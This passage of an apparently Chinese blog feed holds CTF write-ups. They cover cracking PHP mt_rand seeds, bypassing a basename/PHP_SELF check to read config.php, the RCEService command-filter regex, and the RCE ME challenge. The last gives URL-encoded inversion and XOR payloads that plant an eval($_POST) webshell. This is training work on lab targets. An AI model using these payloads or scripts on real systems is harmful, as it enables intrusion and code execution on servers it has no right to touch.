title="审计源码"></a>审计源码</h4><p>开启会话后，判断session中seed值是否为空，是则用rand函数生成一个值，再将其作为mt_srand()的种子，之后利用$str_long1和随机数生成一串字符，最后截取前10个字符呈现。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>由于我们可以通过工具进行爆破出种子，那么我们就可以重复操作得出完整的字符串</p><h4 id="解"><a href="#解" class="headerlink" title="解"></a>解</h4><p>由题目选择，工具的模式（四个参数），前两个是第一次输出区间（即题目给的字符串对应的生成过程中的每个随机数），后两个是输出区间</p><p>生成格式脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;TxnDsJjdHq&quot;</span>;</span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$length</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//55 55 0 61 23 23 0 61 13 13 0 61 39 39 0 61 18 18 0 61 45 45 0 61 9 9 0 61 3 3 0 61 43 43 0 61 16 16 0 61 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用工具爆破。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">工具下载到Linux中：git clone https://github.com/openwall/php_mt_seed.git  进入目录 make一下，然后使用 </span><br><span class="line">./php_mt_seed 55 55 0 61 23 23 0 61 13 13 0 61 39 39 0 61 18 18 0 61 45 45 0 61 9 9 0 61 3 3 0 61 43 43 0 61 16 16 0 61  后得到不同版本的。</span><br><span class="line">种子得是PHP7.1以上的（找不到哪里显示PHP版本，可能都试一试？）</span><br><span class="line">得到种子：773675551</span><br><span class="line">工具官网（https://www.openwall.com/php_mt_seed/）</span><br></pre></td></tr></table></figure><p>后再用题目脚本来得出字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">773675551</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span> = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$str</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&gt;</span><br><span class="line"><span class="comment">//TxnDsJjdHqtrEByP1KYl   （版本也得是7.1以上的）</span></span><br></pre></td></tr></table></figure><p>最后根据题目post一下就有了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;知识点：&quot;&gt;&lt;/a&gt;知识点：&lt;/h3&gt;&lt;h4 id=&quot;一些函数&quot;&gt;&lt;a href=&quot;#一些函数&quot; class=&quot;headerlink&quot; title=&quot;一些函数&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>[Zer0pts2020]Can you guess it?</title>
    <link href="http://van0308.github.io/2023/02/08/Zer0pts2020-Can-you-guess-it/"/>
    <id>http://van0308.github.io/2023/02/08/Zer0pts2020-Can-you-guess-it/</id>
    <published>2023-02-08T15:02:39.000Z</published>
    <updated>2023-02-10T07:45:23.060Z</updated>
    
    <content type="html"><![CDATA[<p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;</span><br><span class="line">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;]` 表示当前 php 文件相对于网站[根目录]的位置地址，与 document root 相关</span><br><span class="line">下面是本地测试截图，也就是`http://.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;]</span><br><span class="line">即在url输入/index.php/config.php 会触发第一个if语句</span><br><span class="line"></span><br><span class="line">basename() 函数会返回路径中的文件名部分</span><br><span class="line">假如路径是/index.php/config.php</span><br><span class="line">浏览器的解析结果都是index.php</span><br><span class="line">而basename会返回config.php</span><br><span class="line">就算后面跟上多余的字符也会返回文件名部分</span><br><span class="line">如/index.php/config.php/?source返回config.php</span><br><span class="line">basename()会去掉文件名开头的非ASCII值。</span><br><span class="line"></span><br><span class="line">random_bytes(num)生成num个随机的字符，bin2hex(str)将字符转化为十六进制数方便我们观察，这里我就想到会不会是之前做过的一个题目，只要种子一样，随机数其实是定下来的，也就是所谓的伪随机数，这里还有一个比较函数hash_squals，比较两个字符串是否一样</span><br><span class="line">查完发现从这里突破的可能性较小</span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>漏洞点：hightlight_file,使路径名解析完是config.php，且绕过第一个if</p><p>绕过第一个if：只要不让解析完config.php是结尾就行,后面加上不可见字符或者其他汉字，中文字符都行——&gt;config.php&#x2F;%ff</p><p>第二个if只需要加上?source就行了</p><p>payload：index.php&#x2F;config.php&#x2F;文?source</p><p>PHP脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function check($str)</span><br><span class="line">&#123;</span><br><span class="line">    return preg_match(&quot;/config\.php\/*$/i&quot;, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; 255; $i++) &#123;</span><br><span class="line">    $url = &quot;/index.php/config.php/&quot; . chr($i);</span><br><span class="line">    if (!check($url)) &#123;</span><br><span class="line">//       echo &quot;\n&quot;;</span><br><span class="line">//       echo $i.&quot;---&quot;.chr($i).&quot;---&quot;.basename($url);</span><br><span class="line">        if (basename($url) == &quot;config.php&quot;) &#123;</span><br><span class="line">            $furl = &quot;http://756d1e03-c817-450b-af4a-23928b5cbb3c.node4.buuoj.cn:81/index.php/config.php/&quot; . chr($i) . &quot;?source&quot;;</span><br><span class="line">//            echo $furl;</span><br><span class="line">            $html = file_get_contents(&quot;http://756d1e03-c817-450b-af4a-23928b5cbb3c.node4.buuoj.cn:81/index.php/config.php/&quot; . chr($i) . &quot;?source&quot;);</span><br><span class="line">            if (preg_match(&quot;/flag\&#123;.*?\&#125;/&quot;, $html, $flag))</span><br><span class="line">            &#123;</span><br><span class="line">                echo $i.&quot;\n&quot;;</span><br><span class="line">//                echo $html;</span><br><span class="line">//                print_r($flag);</span><br><span class="line">                echo $flag[0];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://blog.csdn.net/solitudi/article/details/108912334">https://blog.csdn.net/solitudi/article/details/108912334</a></p><p><a href="https://www.cnblogs.com/yesec/p/15429527.html">https://www.cnblogs.com/yesec/p/15429527.html</a></p><p><a href="https://blog.csdn.net/qq_54929891/article/details/123662382">https://blog.csdn.net/qq_54929891/article/details/123662382</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>[FBCTF2019]RCEService</title>
    <link href="http://van0308.github.io/2023/02/08/FBCTF2019-RCEService/"/>
    <id>http://van0308.github.io/2023/02/08/FBCTF2019-RCEService/</id>
    <published>2023-02-08T11:51:25.000Z</published>
    <updated>2023-02-08T14:52:28.410Z</updated>
    
    <content type="html"><![CDATA[<p>由wp知，题目是有源码的，但是buu没给</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="json传值"><a href="#json传值" class="headerlink" title="json传值"></a>json传值</h2><p>json 两个值由题目知一个是cmd ： 先自己试一试  ?cmd&#x3D;{“cmd”:”ls”}</p><p>返回index.php。继续传，发现返回hacking，研究源码。</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">putenv(&#x27;PATH=/home/rceservice/jail&#x27;);将环境变量重新设置，导致很多命令就无法像平时那样使用，而是得用绝对路径来使用，一般环境变量是配置到/bin中，其他环境变量有/usr/bin /usr/local/bin等这些中，在这些目录下有集成好的系统命令可以使用。</span><br><span class="line"></span><br><span class="line">Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</span><br><span class="line"></span><br><span class="line">量词^和$表示匹配头和尾，过滤了很多函数，</span><br><span class="line">[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]</span><br><span class="line">过滤大写字母数字，还有其他字符</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><h3 id="绕过preg-match"><a href="#绕过preg-match" class="headerlink" title="绕过preg_match"></a>绕过preg_match</h3><h4 id="法一：前后匹配的，这种可以用-0a来绕过"><a href="#法一：前后匹配的，这种可以用-0a来绕过" class="headerlink" title="法一：前后匹配的，这种可以用%0a来绕过"></a>法一：前后匹配的，这种可以用%0a来绕过</h4><p>即</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由wp知，题目是有源码的，但是buu没给&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;lin</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
    <category term="rce" scheme="http://van0308.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>命令执行</title>
    <link href="http://van0308.github.io/2023/02/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://van0308.github.io/2023/02/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-02-05T06:50:58.000Z</published>
    <updated>2023-02-10T14:36:15.540Z</updated>
    
    <content type="html"><![CDATA[<p>PHP</p><p>正则</p><p>学习：<a href="https://blog.csdn.net/kelinfeng16/article/details/82632796">https://blog.csdn.net/kelinfeng16/article/details/82632796</a></p><p>元字符（[] 或者\相关的）、模式修饰符（&#x2F;xxx&#x2F;i  最后面的）、量词（其他）、</p><p>使用反引号运算符”&#96;”的效果与函数shell_exec() 相同。</p><p>注意:<br>关闭了 shell_exec() 时反引号运算符是无效的。<br>与其它某些语言不同，反引号不能在双引号字符串中使用。</p><p><a href="https://blog.csdn.net/superprintf/article/details/111468978">https://blog.csdn.net/superprintf/article/details/111468978</a></p><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://cloud.tencent.com/developer/article/1838778">https://cloud.tencent.com/developer/article/1838778</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://xz.aliyun.com/t/8107#toc-11">https://xz.aliyun.com/t/8107#toc-11</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP&lt;/p&gt;
&lt;p&gt;正则&lt;/p&gt;
&lt;p&gt;学习：&lt;a href=&quot;https://blog.csdn.net/kelinfeng16/article/details/82632796&quot;&gt;https://blog.csdn.net/kelinfeng16/article/de</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[极客大挑战 2019]RCE ME</title>
    <link href="http://van0308.github.io/2023/02/04/rceME/"/>
    <id>http://van0308.github.io/2023/02/04/rceME/</id>
    <published>2023-02-04T13:31:30.000Z</published>
    <updated>2023-02-08T09:58:15.088Z</updated>
    
    <content type="html"><![CDATA[<h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤字母，数字，考虑url编码取反绕过、异或绕过（都是任意PHP版本适用）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><p>简单来说就是</p><p>异或绕过：未被禁用的字符异或后得到想要的字符，然后用.运算符拼接起来从而绕过。</p><p>url编码取反绕过：一些字符取反后可以得到想要的字符，但是这些字符通常是不可见的，所以要用URL编码一下才好编写payload。</p><p>PHP7特性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpinfo() php5/7都可执行</span><br><span class="line">(phpinfo)() php7可执行</span><br><span class="line"></span><br><span class="line">php7支持$&#123;&#125;这种格式。$&#123;&#x27;GET&#x27;&#125;=$GET</span><br></pre></td></tr></table></figure><h4 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h4><p>先利用PHPinfo查看，禁用函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();  //(phpinfo)();</span><br><span class="line">?code=(&#x27;%0b%08%0b%09%0e%06%0f&#x27;^&#x27;%7b%60%7b%60%60%60%60&#x27;)();//(phpinfo)();</span><br></pre></td></tr></table></figure><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><p>由于是@eval($code);</p><p>我们传入   ?code&#x3D;(~%8F%97%8F%96%91%99%90)();   的时候对于PHP，形如 (func_name)()，其中func_name可以是字符串，会执行这个func</p><p>若是整个phpinfo()全部编码，则不会执行，因为PHP还没取反前不知道传入的是可以执行的，所以PHP先取反后不会执行。</p><p>补充：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">既然可以构造函数。那么也可以构造readfile/scandir这种,一些简单的题。直接看flag</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)=var_dump</span><br><span class="line">(~%8C%9C%9E%91%9B%96%8D)=scandir</span><br><span class="line">(~%89%9E%8D%A0%9B%8A%92%8F)((~%8C%9C%9E%91%9B%96%8D)(%27./%27));</span><br><span class="line">var_dump(scandir(&#x27;./&#x27;))</span><br><span class="line">如果./也被过滤。一样。通过~取反获得</span><br><span class="line">注意(~%D1%D0)=./     带括号的编码才等于字符串。</span><br></pre></td></tr></table></figure><h5 id="构造shell"><a href="#构造shell" class="headerlink" title="构造shell"></a>构造shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">目的构造：(assert)(eval($_POST[&#x27;van&#x27;]));</span><br><span class="line"></span><br><span class="line">为什么不构造成assert($_POST[&#x27;van&#x27;]);，因为这样构造出来的是(&quot;assert&quot;)(&quot;$_POST[&#x27;van&#x27;]&quot;)</span><br><span class="line">第二个括号还是字符串，而不会被执行</span><br><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);</span><br><span class="line"># %9E%8C%8C%9A%8D%8B : assert</span><br><span class="line"># %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6 : eval($_POST[shell])</span><br><span class="line">这样则执行顺序 先eval 后assert后eval，成功执行。</span><br></pre></td></tr></table></figure><h5 id="一些可以的"><a href="#一些可以的" class="headerlink" title="一些可以的"></a>一些可以的</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">// $&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"></span><br><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);  //别忘了后面的分号</span><br><span class="line">或者：</span><br><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure><h5 id="连上shell"><a href="#连上shell" class="headerlink" title="连上shell"></a>连上shell</h5><p>看到flag readflag 